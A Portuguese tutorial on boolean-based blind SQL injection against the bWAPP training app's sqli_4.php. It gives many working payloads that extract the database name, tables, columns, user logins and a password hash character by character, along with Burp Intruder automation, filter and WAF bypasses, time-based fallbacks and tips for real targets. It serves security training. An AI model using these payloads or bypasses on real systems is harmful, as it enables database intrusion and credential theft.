# SQL Injection Boolean-Based Blind
### Técnica aprofundada — bWAPP `sqli_4.php` com enumeração completa do `information_schema`

> Este documento expande a Seção 7.1 e 12.6 do `guia_sqli.md` com profundidade cirúrgica em Boolean-based blind. O foco é a metodologia de extração caractere por caractere — do nome do banco até o hash de senha — usando apenas a diferença entre "existe" e "não existe" na resposta da aplicação.

---

## Sumário

1. [O que é Boolean-based blind](#1-o-que-é-boolean-based-blind)
2. [Quando usar](#2-quando-usar)
3. [Detectando o canal SIM/NÃO em sqli_4.php](#3-detectando-o-canal-simnão-em-sqli_4php)
4. [Anatomia do payload boolean blind](#4-anatomia-do-payload-boolean-blind)
5. [Extração caractere por caractere com SUBSTRING](#5-extração-caractere-por-caractere-com-substring)
6. [Otimização com ASCII e busca binária](#6-otimização-com-ascii-e-busca-binária)
7. [Enumeração completa do information_schema](#7-enumeração-completa-do-information_schema)
8. [Automação manual com Burp Intruder](#8-automação-manual-com-burp-intruder)
9. [Outras dicas de payload](#9-outras-dicas-de-payload)
10. [Pegadinhas comuns](#10-pegadinhas-comuns)
11. [Quando boolean blind falha](#11-quando-boolean-blind-falha)
12. [Cheatsheet final](#12-cheatsheet-final)

---

## 1. O que é Boolean-based blind

Em um SQLi clássico (UNION-based ou error-based), a aplicação **reflete** os dados da query de volta para você — seja imprimindo linhas na tela, seja vazando o dado dentro de uma mensagem de erro. Boolean-based blind é o cenário em que essa reflexão não existe: a aplicação não mostra dados, não mostra erros úteis, mas **muda de comportamento** conforme a query retorna resultado ou não.

O "canal" de comunicação é binário: a página tem dois estados observáveis, e você aprende a mapear esses estados para SIM e NÃO. A partir daí, qualquer informação que você queira extrair do banco vira uma sequência de perguntas SIM/NÃO:

- "A primeira letra do nome do banco é maior que 'm' em ASCII?"
- "O nome da segunda tabela tem mais de 5 caracteres?"
- "O hash de senha do usuário 1 começa com '6'?"

Você não vê os dados diretamente. Você **os reconstrói** a partir das respostas.

O "comportamento observável" pode ser qualquer coisa:

| Tipo de diferença | Exemplo |
|-------------------|---------|
| Texto diferente na página | "found" vs "not found" |
| Tamanho do body HTTP diferente | 1.842 bytes vs 1.798 bytes |
| Status HTTP diferente | 200 vs 302 redirect |
| Presença de elemento HTML | tabela de resultados aparece ou some |

Em `sqli_4.php`, o canal é explícito e textual — perfeito para aprender.

---

## 2. Quando usar

Boolean-based blind entra em cena quando as outras técnicas não estão disponíveis:

| Condição | Implicação |
|----------|------------|
| UNION não reflete dados na tela | UNION-based inviável |
| Erros SQL estão suprimidos ou genéricos | Error-based inviável |
| **Existe diferença observável entre query verdadeira e falsa** | ✅ Boolean blind é a ferramenta |
| Diferença observável NÃO existe em nenhum estado | Boolean blind falha → ir para time-based |

Na prática, você testa boolean blind depois de confirmar que:

1. A injeção existe (a query quebra ou muda de comportamento).
2. Você consegue controlar a lógica da query (um `AND 1=1` retorna estado diferente de `AND 1=2`).
3. Os dois estados são distinguíveis com confiança — sem ambiguidade.

---

## 3. Detectando o canal SIM/NÃO em sqli_4.php

### Setup inicial

A query vulnerável está em `bWAPP/sqli_4.php:131`:

```php
$sql = "SELECT * FROM movies WHERE title = '" . sqli($title) . "'";
```

Em `security_level=0` (low), `sqli()` chama `no_check()` — input vai cru para a query. A página retorna um de dois textos:

- `The movie exists in our database!` → query retornou ao menos uma linha
- `The movie does not exist in our database!` → zero linhas

Capture a requisição no Burp e mande para o Repeater. A partir daqui, todos os testes são feitos ali.

### Estabelecendo a âncora

Antes de injetar qualquer coisa, você precisa de um **input-âncora**: um título que você sabe que existe no banco, para ter uma baseline de SIM confiável.

O banco do bWAPP tem `Iron Man` (seed em `install.php`). Confirme:

```
title=Iron Man
```

Resposta esperada: `The movie exists in our database!` — esse é o seu estado SIM limpo.

Agora confirme o estado NÃO:

```
title=TituloQueNaoExiste123
```

Resposta esperada: `The movie does not exist in our database!`.

### Os dois payloads de detecção

Com a âncora estabelecida, injete lógica booleana:

**Payload SIM** — condição sempre verdadeira:
```
Iron Man' AND '1'='1
```

Query gerada no servidor:
```sql
SELECT * FROM movies WHERE title = 'Iron Man' AND '1'='1'
```

Resultado esperado: `The movie exists in our database!`

**Payload NÃO** — condição sempre falsa:
```
Iron Man' AND '1'='2
```

Query gerada no servidor:
```sql
SELECT * FROM movies WHERE title = 'Iron Man' AND '1'='2'
```

Resultado esperado: `The movie does not exist in our database!`

Se a diferença nos textos é clara — e é, literalmente "exists" vs "does not exist" — você tem um canal boolean blind funcional. A exploração pode começar.

> 💡 **Por que usar uma âncora em vez de um input arbitrário?** Porque você precisa que o `WHERE title = '...'` seja verdadeiro por si só. Se o título não existe, a query retorna NÃO independente da sua condição injetada — você perde o canal. A âncora garante que a primeira parte da condição `AND` seja sempre verdadeira, então o resultado depende exclusivamente da sua pergunta.

---

## 4. Anatomia do payload boolean blind

Todo payload boolean blind segue a mesma estrutura:

```
<ÂNCORA>' AND <PERGUNTA> -- -
```

Cada parte tem uma função:

| Parte | Função |
|-------|--------|
| `<ÂNCORA>'` | Fecha a string do WHERE original com um título que existe no banco |
| `AND` | Força que ambas as condições sejam verdadeiras para retornar resultado |
| `<PERGUNTA>` | Expressão SQL que retorna verdadeiro ou falso — aqui mora a extração |
| `-- -` | Comenta o resto da query original para não causar erro de sintaxe |

A `<PERGUNTA>` é qualquer expressão SQL booleana. Exemplos:

```sql
'1'='1'                                        -- sempre verdadeiro
'1'='2'                                        -- sempre falso
LENGTH(database()) = 5                         -- verdadeiro se o banco tem 5 chars
SUBSTRING(database(),1,1) = 'b'               -- verdadeiro se primeiro char é 'b'
ASCII(SUBSTRING(database(),1,1)) > 100        -- verdadeiro se ASCII > 100
(SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = 7
```

O mecanismo é simples: `WHERE title = 'Iron Man' AND <PERGUNTA>` — se `PERGUNTA` for verdadeiro, a linha é retornada e você vê "exists". Se for falso, zero linhas e você vê "does not exist".

---

## 5. Extração caractere por caractere com SUBSTRING

`SUBSTRING(string, posição, comprimento)` extrai um pedaço de uma string. No MySQL/MariaDB, **a posição começa em 1, não em 0**.

Para descobrir o nome do banco atual (`database()`), você extrai um caractere por vez e testa cada possibilidade:

```
Iron Man' AND SUBSTRING(database(),1,1)='a' -- -   → NÃO
Iron Man' AND SUBSTRING(database(),1,1)='b' -- -   → SIM ✅ (primeiro char é 'b')
Iron Man' AND SUBSTRING(database(),2,1)='W' -- -   → SIM ✅ (segundo char é 'W')
Iron Man' AND SUBSTRING(database(),3,1)='A' -- -   → SIM ✅ (terceiro char é 'A')
Iron Man' AND SUBSTRING(database(),4,1)='P' -- -   → SIM ✅ (quarto char é 'P')
Iron Man' AND SUBSTRING(database(),5,1)='P' -- -   → SIM ✅ (quinto char é 'P')
Iron Man' AND SUBSTRING(database(),6,1)='' -- -    → SIM ✅ (string terminou)
```

Você reconstruiu `bWAPP` letra por letra.

O problema é a quantidade de requisições: para cada posição, no pior caso você testa 26 minúsculas + 26 maiúsculas + 10 dígitos + símbolos = ~95 possibilidades. Para uma string de 10 caracteres: até 950 requisições. Inviável à mão, lento até no Intruder.

A solução é a busca binária por valor ASCII.

---

## 6. Otimização com ASCII e busca binária

Em vez de testar caractere por caractere, você testa o **valor numérico ASCII** com comparações `>` e `<`. Isso permite uma busca binária que resolve qualquer caractere em ~7 requisições, independente do alfabeto.

### O algoritmo

```
low = 32     (espaço — menor ASCII imprimível)
high = 126   (~ — maior ASCII imprimível comum)

enquanto low < high:
    mid = (low + high) / 2   (arredonda para baixo)
    se ASCII(SUBSTRING(alvo, pos, 1)) > mid:
        low = mid + 1
    senão:
        high = mid

resultado = low   (= high quando o loop termina)
```

Quando `low == high`, você encontrou o código ASCII do caractere. Converta: `chr(98)` = `'b'`.

### Exemplo completo: extraindo 'b' (ASCII 98)

Alvo: `SUBSTRING(database(),1,1)` — primeiro caractere do banco.

| Passo | Payload | Estado | Ação |
|-------|---------|--------|------|
| 1 | `ASCII(...) > 79` | SIM (98 > 79) | `low = 80` |
| 2 | `ASCII(...) > 103` | NÃO (98 < 103) | `high = 103` |
| 3 | `ASCII(...) > 91` | SIM (98 > 91) | `low = 92` |
| 4 | `ASCII(...) > 97` | SIM (98 > 97) | `low = 98` |
| 5 | `ASCII(...) > 100` | NÃO (98 < 100) | `high = 100` |
| 6 | `ASCII(...) > 99` | NÃO (98 < 99) | `high = 99` |
| 7 | low(98) == high(99)? não — `ASCII(...) > 98` | NÃO | `high = 98` |
| — | low(98) == high(98) | loop termina | resultado = 98 = `'b'` ✅ |

Sete requisições para resolver um caractere, contra potencialmente 95 na força bruta direta.

Os payloads concretos para esse exemplo:

```
Iron Man' AND ASCII(SUBSTRING(database(),1,1)) > 79 -- -    → SIM
Iron Man' AND ASCII(SUBSTRING(database(),1,1)) > 103 -- -   → NÃO
Iron Man' AND ASCII(SUBSTRING(database(),1,1)) > 91 -- -    → SIM
Iron Man' AND ASCII(SUBSTRING(database(),1,1)) > 97 -- -    → SIM
Iron Man' AND ASCII(SUBSTRING(database(),1,1)) > 100 -- -   → NÃO
Iron Man' AND ASCII(SUBSTRING(database(),1,1)) > 99 -- -    → NÃO
Iron Man' AND ASCII(SUBSTRING(database(),1,1)) > 98 -- -    → NÃO
```

`low` e `high` convergem para 98. `chr(98)` = `b`. Próxima posição.

---

## 7. Enumeração completa do information_schema

Esta é a seção principal. Vamos extrair tudo: nome do banco, tabelas, colunas e até o hash de senha — payload por payload, explicando o que cada resposta significa.

> ⚠️ **Regra de ouro para subqueries em boolean blind:** toda subquery que você usar como argumento de `SUBSTRING()` ou `ASCII()` precisa retornar **exatamente uma linha e uma coluna**. Se retornar mais de uma linha, o MariaDB gera o erro "Subquery returns more than 1 row" e a query quebra. Use sempre `LIMIT N,1` para isolar uma linha.

---

### 7.1 Tamanho do nome do banco (`database()`)

Antes de extrair os caracteres, descubra quantos são — assim você sabe quando parar.

**Confirmação direta:**
```
Iron Man' AND LENGTH(database())=5 -- -
```
Resposta esperada: `The movie exists in our database!` → o banco tem exatamente 5 caracteres (`bWAPP`).

**Descoberta por busca binária (quando não sabe o tamanho):**

```
Iron Man' AND LENGTH(database()) > 3 -- -   → SIM
Iron Man' AND LENGTH(database()) > 7 -- -   → NÃO
Iron Man' AND LENGTH(database()) > 5 -- -   → NÃO
Iron Man' AND LENGTH(database()) > 4 -- -   → SIM
Iron Man' AND LENGTH(database()) = 5 -- -   → SIM ✅
```

Confirmo: 5 caracteres.

---

### 7.2 Nome do banco caractere por caractere

Com 5 caracteres confirmados, extraia cada um:

**Posição 1 — esperado 'b' (ASCII 98):**
```
Iron Man' AND ASCII(SUBSTRING(database(),1,1)) = 98 -- -
```
Resposta: SIM. Char 1 = `b`.

**Posição 2 — esperado 'W' (ASCII 87):**
```
Iron Man' AND ASCII(SUBSTRING(database(),2,1)) = 87 -- -
```
Resposta: SIM. Char 2 = `W`.

**Posição 3 — esperado 'A' (ASCII 65):**
```
Iron Man' AND ASCII(SUBSTRING(database(),3,1)) = 65 -- -
```
Resposta: SIM. Char 3 = `A`.

**Posição 4 — esperado 'P' (ASCII 80):**
```
Iron Man' AND ASCII(SUBSTRING(database(),4,1)) = 80 -- -
```
Resposta: SIM. Char 4 = `P`.

**Posição 5 — esperado 'P' (ASCII 80):**
```
Iron Man' AND ASCII(SUBSTRING(database(),5,1)) = 80 -- -
```
Resposta: SIM. Char 5 = `P`.

Resultado reconstruído: `b` + `W` + `A` + `P` + `P` = **`bWAPP`** ✅

---

### 7.3 Quantas tabelas existem no banco atual

```
Iron Man' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=7 -- -
```

Interprete a resposta:
- SIM → o banco tem exatamente 7 tabelas. Confirme.
- NÃO → ajuste o número. Faça busca binária com `> N` até encontrar.

> 💡 No bWAPP o número exato de tabelas pode variar dependendo da versão e dos exercícios instalados. Não assuma — descubra com busca binária primeiro e depois confirme com `=`.

---

### 7.4 Nome da primeira tabela

Aqui entra a subquery com `LIMIT`. A estrutura é:

```sql
(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)
```

`LIMIT 0,1` significa: "pule 0 linhas e retorne 1". Isso garante que a subquery retorne **uma única linha**, satisfazendo a restrição do boolean blind.

**Tamanho do nome da primeira tabela:**
```
Iron Man' AND LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)) > 3 -- -
```

**Primeiro caractere do nome da primeira tabela:**
```
Iron Man' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)) = 98 -- -
```

Se retornar SIM, o nome começa com `b` (ASCII 98) — provavelmente `blog`.

**Segundo caractere:**
```
Iron Man' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),2,1)) = 108 -- -
```

SIM → `l` (ASCII 108). Continua: `bl`, `blo`, `blog`.

---

### 7.5 Nome da segunda tabela

Troque `LIMIT 0,1` por `LIMIT 1,1` — "pule 1 linha e retorne 1":

```
Iron Man' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1),1,1)) = 104 -- -
```

SIM → primeiro char é `h` (ASCII 104). Provavelmente `heroes`. Continue extraindo.

Para a N-ésima tabela, use `LIMIT N-1,1`. A tabela `users` é a que interessa — descubra em qual posição ela está e ajuste o LIMIT.

---

### 7.6 Quantas colunas a tabela `users` tem

```
Iron Man' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='users')=9 -- -
```

Resposta SIM confirma 9 colunas. Faça busca binária se não souber o número exato:

```
Iron Man' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='users') > 5 -- -
Iron Man' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='users') > 7 -- -
```

> ⚠️ **Se aspa simples for filtrada (medium/high):** substitua `'users'` pelo equivalente hex. No terminal: `echo -n 'users' | xxd -p` → `7573657273`. Use `0x7573657273` no payload:
>
> ```
> ... AND table_name=0x7573657273 ...
> ```

---

### 7.7 Nome de cada coluna da tabela `users`

Seguindo o mesmo padrão — subquery com `LIMIT N,1` para isolar cada coluna:

**Primeira coluna (esperado `id`):**
```
Iron Man' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1),1,1)) = 105 -- -
```

SIM → `i` (ASCII 105). Continue:

```
Iron Man' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1),2,1)) = 100 -- -
```

SIM → `d` (ASCII 100). Nome da coluna 0: `id`.

**Segunda coluna (esperado `login`):**
```
Iron Man' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 1,1),1,1)) = 108 -- -
```

SIM → `l` (ASCII 108). Continue extraindo: `l`, `lo`, `log`, `logi`, `login`.

**Terceira coluna (esperado `password`):**
```
Iron Man' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 2,1),1,1)) = 112 -- -
```

SIM → `p` (ASCII 112). Continue: `pa`, `pas`, `pass`, ..., `password`.

Repita o padrão para todas as 9 colunas. Quando encontrar `login` e `password`, você tem tudo que precisa para o próximo passo.

---

### 7.8 Tamanho do campo password do usuário 1

SHA-1 sem salt gera um hash de 40 caracteres hexadecimais. Confirme antes de extrair:

```
Iron Man' AND LENGTH((SELECT password FROM users LIMIT 0,1))=40 -- -
```

Resposta SIM confirma 40 chars. Isso já revela que o armazenamento é SHA-1 (40 hex) e não bcrypt (60 chars) nem MD5 (32 chars) — informação útil para a fase de quebra offline.

---

### 7.9 Extraindo o hash de senha caractere por caractere

Com 40 caracteres para extrair, a busca binária é essencial. Para o hash SHA-1 só existem hex lowercase (`0-9` e `a-f`), então ASCII range é 48–102 — o que acelera ainda mais.

**Primeiro caractere do hash:**
```
Iron Man' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)) = 54 -- -
```

SIM → `6` (ASCII 54). O hash começa com `6`.

**Segundo caractere:**
```
Iron Man' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),2,1)) = 56 -- -
```

SIM → `8` (ASCII 56).

Continue para todas as 40 posições. O hash do usuário `bee` no bWAPP é `6885858486f31043e5839c735d99457f045affd0` (SHA-1 de `bug`).

> 💡 **Atalho:** para hashes hex, restinja o range de busca binária a 48–102 (chars `0`-`f`). Isso reduz a busca de ~7 requisições para ~6 por caractere.

**Extraindo login do usuário 1 (para confirmar contexto):**
```
Iron Man' AND ASCII(SUBSTRING((SELECT login FROM users LIMIT 0,1),1,1)) = 98 -- -
```

SIM → `b`. Continue: `b`, `be`, `bee`. Usuário 1 é `bee`.

**Segundo usuário — troque `LIMIT 0,1` por `LIMIT 1,1`:**
```
Iron Man' AND ASCII(SUBSTRING((SELECT login FROM users LIMIT 1,1),1,1)) = 97 -- -
```

> 💡 **Lendo múltiplos usuários:** itere o primeiro argumento do LIMIT (0, 1, 2, 3...) para percorrer todos os registros da tabela.

---

## 8. Automação manual com Burp Intruder

"Manual" não significa "à mão requisição por requisição". O Burp Intruder automatiza a iteração mantendo você no controle da lógica.

### Configuração para extração de string (força bruta por posição × ASCII)

1. No Repeater, clique com botão direito → **Send to Intruder**.

2. Na aba **Positions**, limpe as posições automáticas (Clear §). Marque duas posições manualmente no payload:

   ```
   title=Iron Man' AND ASCII(SUBSTRING(database(),§1§,1))=§65§ -- -
   ```

   Posição 1: o índice (qual caractere estamos extraindo).
   Posição 2: o valor ASCII que estamos testando.

3. **Attack type:** `Cluster Bomb` — testa todas as combinações de payload set 1 × payload set 2.

4. **Payload set 1** (posições no string): Numbers, from 1 to 10, step 1.

5. **Payload set 2** (valores ASCII testados): Numbers, from 32 to 126, step 1.

6. Na aba **Settings**:
   - Em **Grep - Match**, adicione `exists` como string de match. Isso cria uma coluna binária na tabela de resultados.
   - Defina **Max concurrent requests** baixo (5–10) para não sobrecarregar o container Docker local.

7. Clique **Start Attack**.

### Lendo os resultados

| Coluna | O que observar |
|--------|---------------|
| `Length` | Respostas SIM têm tamanho diferente das NÃO — ordene por esta coluna |
| `exists` (Grep-Match) | `1` = contém "exists" = SIM, `0` = NÃO |
| `Payload 1` | Posição no string |
| `Payload 2` | Valor ASCII testado |

Filtre as linhas onde `exists = 1`. Para cada valor de Posição, haverá exatamente um valor ASCII que retornou SIM — esse é o código ASCII do caractere naquela posição. Ordene por Payload 1 e leia os Payload 2 em sequência para reconstruir a string.

### Cluster Bomb vs. Sniper para busca binária

Se quiser usar busca binária no Intruder (mais eficiente):

- **Sniper** com um payload de valores para comparação `>`: mark só o valor numérico, itere 32–126.
- Faça uma rodada por posição, registrando qual valor vira a resposta de SIM para NÃO.
- O ponto de virada é o valor ASCII do caractere.

Isso exige mais iteração manual de leitura dos resultados, mas usa ~7× menos requisições que Cluster Bomb.

---

## 9. Outras dicas de payload

### Funções alternativas ao SUBSTRING

Se `SUBSTRING` for bloqueada por WAF ou filtro de string:

```sql
-- MID() é sinônimo exato de SUBSTRING() no MySQL/MariaDB
MID(database(),1,1)

-- LEFT() retorna os N primeiros chars — útil para confirmar prefixo
LEFT(database(),1) = 'b'

-- RIGHT() retorna os N últimos chars
RIGHT(database(),1) = 'P'

-- SUBSTR() também funciona (alias)
SUBSTR(database(),1,1)
```

### STRCMP para busca binária em uma requisição

`STRCMP(str1, str2)` retorna -1, 0 ou 1:

```sql
STRCMP(SUBSTRING(database(),1,1), 'n') < 0
```

Verdadeiro se o char é anterior a 'n' na ordem ASCII — equivale a `ASCII(...) < ASCII('n')`. Permite fazer busca binária com comparações de caractere direto em vez de valores numéricos.

### BENCHMARK como fallback

Se você tiver acesso a time-based mas SUBSTRING não funcionar por algum filtro específico:

```sql
Iron Man' AND IF(LENGTH(database())=5, BENCHMARK(5000000,SHA1('a')), 0) -- -
```

`BENCHMARK(N, expr)` executa `expr` N vezes e demora proporcionalmente. Mais estável que `SLEEP()` em algumas configurações porque não depende de um timer do SO — depende da CPU do servidor.

### Bypasses de espaço

Se espaços forem filtrados:

```sql
-- Comentário inline no lugar do espaço
Iron/**/Man'/**/AND/**/ASCII(SUBSTRING(database(),1,1))=98/**/--/**/-

-- Tab (%09) e newline (%0a) são whitespace válido em SQL
Iron%09Man'%09AND%09ASCII(SUBSTRING(database(),1,1))=98%09--%09-
```

### Hex em vez de aspas para strings

Quando não pode usar aspas dentro da subquery (ex: medium/high com addslashes):

```sql
-- 'users' em hex
table_name = 0x7573657273

-- 'bWAPP' em hex
table_schema = 0x6257415050

-- Converter no terminal
echo -n 'users' | xxd -p    # → 7573657273, use como 0x7573657273
```

---

## 10. Pegadinhas comuns

### Subquery retornando múltiplas linhas

```
Subquery returns more than 1 row
```

Esse erro aparece quando você faz uma subquery sem `LIMIT` em um contexto que espera um único valor:

```sql
-- ERRADO — pode retornar muitas linhas
ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database()),1,1))

-- CORRETO — LIMIT 0,1 isola uma linha
ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1))
```

Em boolean blind, se a subquery explodir com erro, a query inteira falha e você vê "does not exist" — não porque a condição é falsa, mas porque há um erro. Isso pode levar você a concluir que o caractere está errado quando na verdade o problema é a estrutura.

### Posição 0 vs 1 no SUBSTRING

MySQL e MariaDB usam **indexação baseada em 1**:

```sql
SUBSTRING('bWAPP', 1, 1) = 'b'    -- correto
SUBSTRING('bWAPP', 0, 1) = ''     -- retorna string vazia, não 'b'!
```

Isso é diferente de muitas linguagens de programação onde índices começam em 0. Se você acidentalmente usar posição 0, a extração vai retornar string vazia e todas as suas comparações vão falhar — parecendo que a string está vazia.

### Aspa em strings comparadas dentro da subquery

Quando você precisa comparar `table_name = 'users'` dentro de uma subquery, e o nível de segurança filtra aspas, use hex:

```sql
-- Com aspa (funciona em low)
table_name = 'users'

-- Com hex (funciona em medium quando addslashes escapa aspas)
table_name = 0x7573657273
```

### Cache e CDN interferindo

Em ambientes de produção (não no bWAPP local), CDN ou Nginx pode cachear respostas. Se você mandar o mesmo path duas vezes e receber a mesma resposta cached, o tamanho do body vai parecer idêntico para SIM e NÃO — destruindo seu canal boolean.

No bWAPP local isso não ocorre, mas em alvos reais: adicione um parâmetro aleatório de cache-busting na URL (`&_=<random>`) e observe os headers `Cache-Control` e `Age` nas respostas.

### Diferença de tamanho inconsistente

Em algumas aplicações, a diferença entre SIM e NÃO é de apenas alguns bytes e pode flutuar por pequenas variações no HTML (timestamps, contadores, sessão). Se o tamanho variar ±N bytes entre requisições, use Grep-Match em vez de Length como critério de diferenciação.

### WAF normalizando o payload

WAFs avançados normalizam o input antes de comparar com assinaturas. Se `SUBSTRING` for bloqueada mas `MID` não, use `MID`. Se `AND` for bloqueado, use `&&`. Se `=` for bloqueado em contexto específico, use `LIKE` (MySQL: `LIKE 'b'` funciona como `='b'` para strings sem wildcards).

---

## 11. Quando boolean blind falha

Boolean blind exige que exista **ao menos uma diferença observável** entre query verdadeira e falsa. Quando isso não existe:

- A página tem comportamento idêntico para zero linhas e muitas linhas.
- O HTML é gerado dinamicamente mas o diff está numa parte que você não consegue observar (ex: log interno, cookie httponly).
- A aplicação retorna 200 OK com o mesmo body para tudo.

Nesse cenário, o próximo passo é **time-based blind**: o tempo de resposta como canal.

```sql
Iron Man' AND IF(ASCII(SUBSTRING(database(),1,1)) > 79, SLEEP(3), 0) -- -
```

Se demorou ~3s → a condição é verdadeira. Se voltou imediato → falsa.

A lógica de extração (busca binária, iteração por posição, subqueries com LIMIT) é **idêntica** — só o canal muda de "texto na página" para "tempo de resposta".

Para praticar time-based no bWAPP, veja o arquivo `time_based.md` desta mesma pasta.

---

## 12. Cheatsheet final

```
# --- Detecção do canal ---
<input>' AND '1'='1 -- -    (deve retornar estado SIM)
<input>' AND '1'='2 -- -    (deve retornar estado NÃO)

# --- Tamanho de string ---
<input>' AND LENGTH(database())=N -- -
<input>' AND LENGTH(database()) > N -- -   (busca binária)

# --- Caractere por posição (força bruta direta) ---
<input>' AND SUBSTRING(database(),POS,1)='CHAR' -- -

# --- Caractere por posição (via ASCII — recomendado) ---
<input>' AND ASCII(SUBSTRING(database(),POS,1)) > MID -- -
<input>' AND ASCII(SUBSTRING(database(),POS,1)) = CODE -- -

# --- Subquery única com LIMIT ---
<input>' AND ASCII(SUBSTRING((SELECT coluna FROM tabela WHERE cond LIMIT N,1),POS,1)) = CODE -- -

# --- Contagem ---
<input>' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = N -- -

# --- information_schema: tabelas ---
<input>' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)) = CODE -- -

# --- information_schema: colunas ---
<input>' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1),1,1)) = CODE -- -

# --- Dados: hash de senha ---
<input>' AND LENGTH((SELECT password FROM users LIMIT 0,1)) = 40 -- -
<input>' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 0,1),POS,1)) = CODE -- -

# --- Bypasses ---
# Aspas → hex
table_name = 0x7573657273        (hex de 'users')
table_schema = 0x6257415050      (hex de 'bWAPP')

# Espaços → comentário inline
AND/**/ → AND/**/

# SUBSTRING filtrado
MID(str,pos,len)   ou   SUBSTR(str,pos,len)

# Converter string para hex no terminal
echo -n 'minhastring' | xxd -p
```

---

**Lembre-se: boolean blind é lento por design. A disciplina de busca binária e o uso sistemático do Intruder são o que separam uma extração de 10 minutos de uma de 3 horas. Domine o algoritmo, não decore os payloads.**
